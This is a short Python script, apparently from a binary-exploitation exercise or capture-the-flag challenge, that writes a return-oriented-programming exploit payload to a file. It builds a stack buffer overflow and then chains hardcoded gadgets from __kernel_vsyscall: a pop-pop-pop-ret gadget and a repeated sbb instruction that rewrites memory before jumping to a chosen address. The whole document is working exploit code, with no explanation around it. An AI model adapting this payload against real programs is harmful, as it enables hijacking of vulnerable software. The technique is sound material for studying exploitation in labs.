from struct import pack

f = open("payload","w")
'''
   0x5555542e <__kernel_vsyscall+14>:   int    0x80
   0x55555430 <__kernel_vsyscall+16>:   pop    ebp
   0x55555431 <__kernel_vsyscall+17>:   pop    edx
   0x55555432 <__kernel_vsyscall+18>:   pop    ecx
   0x55555433 <__kernel_vsyscall+19>:   ret

   0x5555542f <__kernel_vsyscall+15>:   sbb    BYTE PTR [ebp+0x5a],0x59
   0x55555433 <__kernel_vsyscall+19>:   ret
'''

pppr = 0x55555430 # pop ebp; pop edx; pop ecx; ret
prot = 0x8049158
sbb_gadget = 0x5555542f

payload = "A"*12 + "BBBB"
payload+= pack("<L", pppr)
payload+= pack("<L", 0x80490fe)		# ebp
payload+= pack("<L", 0xdeadbeef)	# edx
payload+= pack("<L", 0xdeadbeef)	# ecx
payload+= pack("<L", sbb_gadget)
payload+= pack("<L", sbb_gadget)
payload+= pack("<L", sbb_gadget)

payload+= pack("<L", 0x80480a0)

f.write(payload)
f.close()
